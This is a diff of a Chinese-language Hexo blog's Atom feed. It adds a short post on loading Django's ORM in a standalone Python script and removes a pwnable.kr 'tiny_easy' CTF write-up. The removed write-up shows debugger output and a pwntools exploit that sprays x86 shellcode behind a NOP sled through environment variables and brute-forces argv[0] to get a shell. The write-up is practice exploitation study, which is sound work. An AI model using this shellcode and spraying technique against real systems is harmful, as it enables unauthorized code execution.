@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://weaponx.site/"/>
-  <updated>2017-09-14T08:45:23.291Z</updated>
+  <updated>2017-10-03T07:32:55.724Z</updated>
   <id>http://weaponx.site/</id>
   
   <author>
@@ -14,6 +14,35 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>python脚本中使用Django函数</title>
+    <link href="http://weaponx.site/2017/10/03/python%E8%84%9A%E6%9C%AC%E4%B8%AD%E4%BD%BF%E7%94%A8Django%E5%87%BD%E6%95%B0/"/>
+    <id>http://weaponx.site/2017/10/03/python脚本中使用Django函数/</id>
+    <published>2017-10-03T07:25:37.000Z</published>
+    <updated>2017-10-03T07:32:55.724Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近有一个需求，需要使用Django的ORM。众所周知，可以使用<code>python manage.py shell</code>在Django shell中使用，但是这次的场景中需要的代码量比较大，所以用Django shell很不方便。</p>
+<p>其实，在python脚本中导入Django的环境即可使用当前的Django ORM。</p>
+<p>比如，我们的脚本和manage.py在同级目录下。我们Django Project叫demo，可以使用如下脚本来导入Django环境。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">sys.path.append(<span class="string">"../"</span>)</div><div class="line"><span class="keyword">from</span> django.core.management <span class="keyword">import</span> setup_environ</div><div class="line"><span class="keyword">import</span> demo.settings</div><div class="line">setup_environ(demo.settings)</div></pre></td></tr></table></figure>
+<p>之后即可导入models使用ORM了，例如导入app test中的User模型。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> test.models <span class="keyword">import</span> User</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近有一个需求，需要使用Django的ORM。众所周知，可以使用&lt;code&gt;python manage.py shell&lt;/code&gt;在Django shell中使用，但是这次的场景中需要的代码量比较大，所以用Django shell很不方便。&lt;/p&gt;
+&lt;p&gt;其实，在pyt
+    
+    </summary>
+    
+      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
+    
+    
+      <category term="Django" scheme="http://weaponx.site/tags/Django/"/>
+    
+  </entry>
   
   <entry>
     <title>从Xshell后门看DLL加载流程</title>
@@ -897,46 +926,6 @@
       &lt;h2 id=&quot;0x00-md5-caculater&quot;&gt;&lt;a href=&quot;#0x00-md5-caculater&quot; class=&quot;headerlink&quot; title=&quot;0x00 md5 caculater&quot;&gt;&lt;/a&gt;0x00 md5 caculater&lt;/h2&gt;&lt;p&gt;下载下来直接运行，提示缺&lt;code&gt;libcrypto&lt;/code&gt;库，但是我却安装过了&lt;code&gt;openssl&lt;/code&gt;。于是在lib下看，确实是没有这个库。因为我的环境是&lt;code&gt;ubuntu x86_64&lt;/code&gt;装的&lt;code&gt;openssl&lt;/code&gt;也是64位的，所以要安装32位的库，使用这个命令:&lt;/p&gt;
 &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sudo apt-get install --reinstall libssl1.0.0:i386&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;安装好后反汇编一下，程序很简单。先生成一个随机数token，输入的值和随机数token相等则再输入一串base64编码后的文本，将这个文本解密后用md5加密打印。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
-    
-    
-      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>tiny_easy Writeup[pwnable.kr]</title>
-    <link href="http://weaponx.site/2017/03/02/tiny-easy-Writeup-pwnable-kr/"/>
-    <id>http://weaponx.site/2017/03/02/tiny-easy-Writeup-pwnable-kr/</id>
-    <published>2017-03-02T10:37:12.000Z</published>
-    <updated>2017-03-02T11:21:03.089Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-tiny-easy"><a href="#0x00-tiny-easy" class="headerlink" title="0x00 tiny_easy"></a>0x00 tiny_easy</h2><p>这个文件用sftp传下来看了一下，文件很小只有4k，代码也很少，直接执行则会报错。</p>
-<a id="more"></a>
-<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>直接入口点下断，看为何出现段错误。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0x0 </div><div class="line">EBX: 0x0 </div><div class="line">ECX: 0x0 </div><div class="line">EDX: 0x0 </div><div class="line">ESI: 0x0 </div><div class="line">EDI: 0x0 </div><div class="line">EBP: 0x0 </div><div class="line">ESP: 0xffffd6e0 --&gt; 0x1 </div><div class="line">EIP: 0x8048054 (pop    eax)</div><div class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x804804e:   add    BYTE PTR [eax],al</div><div class="line">   0x8048050:   add    BYTE PTR [eax],dl</div><div class="line">   0x8048052:   add    BYTE PTR [eax],al</div><div class="line">=&gt; 0x8048054:   pop    eax</div><div class="line">   0x8048055:   pop    edx</div><div class="line">   0x8048056:   mov    edx,DWORD PTR [edx]</div><div class="line">   0x8048058:   call   edx</div><div class="line">   0x804805a:   add    BYTE PTR [eax],al</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd6e0 --&gt; 0x1 </div><div class="line">0004| 0xffffd6e4 --&gt; 0xffffd819 (<span class="string">"/home/user/pwn/pwnkr/tiny_easy/tiny_easy"</span>)</div><div class="line">0008| 0xffffd6e8 --&gt; 0x0 </div><div class="line">0012| 0xffffd6ec --&gt; 0xffffd842 (<span class="string">"USER=user"</span>)</div><div class="line">0016| 0xffffd6f0 --&gt; 0xffffd84c (<span class="string">"LOGNAME=user"</span>)</div><div class="line">0020| 0xffffd6f4 --&gt; 0xffffd859 (<span class="string">"HOME=/home/user"</span>)</div><div class="line">0024| 0xffffd6f8 --&gt; 0xffffd869 (<span class="string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"</span>)</div><div class="line">0028| 0xffffd6<span class="built_in">fc</span> --&gt; 0xffffd8c7 (<span class="string">"MAIL=/var/mail/user"</span>)</div><div class="line">[------------------------------------------------------------------------------]</div></pre></td></tr></table></figure>
-<p>可以看出代码很简单，<code>EDX</code>为<code>/home/user/pwn/pwnkr/tiny_easy/tiny_easy</code>，然后<code>mov    edx,DWORD PTR [edx]</code>把<code>EDX</code>的内容重新赋值给<code>EDX</code>。最后<code>call   edx</code>完成调用。</p>
-<p>其实说白了就是只要能控制<code>argv[0]</code>就可以控制<code>EIP</code>，因为环境变量也放在栈上，所以我们可以将shellcode放在栈上。但是现在有两个难点：</p>
-<ol>
-<li>是否有DEP（是否可以执行shellcode）</li>
-<li>是否有ASLR（如何将<code>EIP</code>指向shellcode）</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ checksec </div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure>
-<p>悲剧的是，既有<code>ASLR</code>也有<code>DEP</code>。但是突然发现这个<code>DEP</code>确没啥效果，栈上还是有执行权限的。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ getpid</div><div class="line">2844</div><div class="line">gdb-peda$ shell</div><div class="line">------------------------------------------------------------</div><div class="line">~/pwn/pwnkr/tiny_easy ? cat /proc/2844/maps</div><div class="line">08048000-08049000 r-xp 00000000 08:01 2493481                            /home/user/pwn/pwnkr/tiny_easy/tiny_easy</div><div class="line">f7ffa000<span class="_">-f</span>7ffc000 r--p 00000000 00:00 0                                  [vvar]</div><div class="line">f7ffc000<span class="_">-f</span>7ffe000 r-xp 00000000 00:00 0                                  [vdso]</div><div class="line">fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]</div></pre></td></tr></table></figure>
-<p>所以现在首要目标就是突破<code>ASLR</code>，能使得<code>EIP</code>可以指向我们的shellcode。</p>
-<h2 id="0x02-Solution"><a href="#0x02-Solution" class="headerlink" title="0x02 Solution"></a>0x02 Solution</h2><p>突破<code>ASLR</code>，想到了之前的堆喷射(Heap Spray)，用大量的滑行区来填充shellcode的前部。只要<code>EIP</code>能落在滑行区就可以执行shellcode。只要部署大量的带有滑行区的shellcode，多次尝试，肯定会有<code>EIP</code>落入滑行区的时候，所以最终的Eploit如下:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">fromm pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">shellcode  = <span class="string">"\xeb\x11\x5e\x31\xc9\xb1\x32\x80"</span></div><div class="line">shellcode += <span class="string">"\x6c\x0e\xff\x01\x80\xe9\x01\x75"</span></div><div class="line">shellcode += <span class="string">"\xf6\xeb\x05\xe8\xea\xff\xff\xff"</span></div><div class="line">shellcode += <span class="string">"\x32\xc1\x51\x69\x30\x30\x74\x69"</span></div><div class="line">shellcode += <span class="string">"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"</span></div><div class="line">shellcode += <span class="string">"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"</span></div><div class="line"></div><div class="line">payload = <span class="string">"\x90"</span> * <span class="number">8000</span> + shellcode</div><div class="line"><span class="comment">#p64(0xff9c3844)</span></div><div class="line">env = &#123;&#125;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x100</span>):</div><div class="line">    env[str(i)] = payload</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    io = process([p32(<span class="number">0xff9c3844</span>)],executable=<span class="string">"/home/user/pwn/pwnkr/tiny_easy/tiny_easy"</span>, env=env)</div><div class="line">    io.interactive()</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;0x00-tiny-easy&quot;&gt;&lt;a href=&quot;#0x00-tiny-easy&quot; class=&quot;headerlink&quot; title=&quot;0x00 tiny_easy&quot;&gt;&lt;/a&gt;0x00 tiny_easy&lt;/h2&gt;&lt;p&gt;这个文件用sftp传下来看了一下，文件很小只有4k，代码也很少，直接执行则会报错。&lt;/p&gt;
     
     </summary>
     
